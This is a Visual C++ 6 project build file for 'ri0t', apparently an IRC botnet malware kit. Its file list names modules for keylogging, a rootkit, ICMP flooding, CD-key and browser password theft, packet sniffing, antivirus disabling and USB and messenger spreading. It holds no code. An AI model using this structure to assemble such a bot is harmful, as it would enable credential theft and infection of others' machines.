# Microsoft Developer Studio Project File - Name="ri0t" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=ri0t - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "ri0t.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "ri0t.mak" CFG="ri0t - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "ri0t - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "ri0t - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "ri0t - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir ""
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "ri0t - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "ri0t - Win32 Release"
# Name "ri0t - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\cpp\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\avirus.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\connect.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\download.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\firefox.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\msn.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\peer2peer.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\persist.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\protocol.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\pstore.cpp
# End Source File
# Begin Source File

SOURCE=.\res.rc
# End Source File
# Begin Source File

SOURCE=.\cpp\ri0t.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\rootkit.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\startup.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\usb.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\wildcard.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\h\autostart.h
# End Source File
# Begin Source File

SOURCE=.\h\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\h\commands.h
# End Source File
# Begin Source File

SOURCE=.\configs.h
# End Source File
# Begin Source File

SOURCE=.\h\connect.h
# End Source File
# Begin Source File

SOURCE=.\h\crc32.h
# End Source File
# Begin Source File

SOURCE=.\h\crypt.h
# End Source File
# Begin Source File

SOURCE=.\h\defines.h
# End Source File
# Begin Source File

SOURCE=.\h\download.h
# End Source File
# Begin Source File

SOURCE=.\h\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\h\externs.h
# End Source File
# Begin Source File

SOURCE=.\h\findfile.h
# End Source File
# Begin Source File

SOURCE=.\h\firefox.h
# End Source File
# Begin Source File

SOURCE=.\h\functions.h
# End Source File
# Begin Source File

SOURCE=.\h\globals.h
# End Source File
# Begin Source File

SOURCE=.\h\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\h\includes.h
# End Source File
# Begin Source File

SOURCE=.\h\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\h\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\h\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\h\misc.h
# End Source File
# Begin Source File

SOURCE=.\h\msn.h
# End Source File
# Begin Source File

SOURCE=.\h\netutils.h
# End Source File
# Begin Source File

SOURCE=.\h\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\h\passwd.h
# End Source File
# Begin Source File

SOURCE=.\h\peer2peer.h
# End Source File
# Begin Source File

SOURCE=.\h\processes.h
# End Source File
# Begin Source File

SOURCE=.\h\protocol.h
# End Source File
# Begin Source File

SOURCE=.\h\psniff.h
# End Source File
# Begin Source File

SOURCE=.\h\ri0t.h
# End Source File
# Begin Source File

SOURCE=.\h\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\h\rootkit.h
# End Source File
# Begin Source File

SOURCE=.\h\secure.h
# End Source File
# Begin Source File

SOURCE=.\h\startup.h
# End Source File
# Begin Source File

SOURCE=.\h\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\h\threads.h
# End Source File
# Begin Source File

SOURCE=.\h\usb.h
# End Source File
# Begin Source File

SOURCE=.\h\visit.h
# End Source File
# Begin Source File

SOURCE=.\h\wildcard.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\jpg.ico
# End Source File
# End Target
# End Project
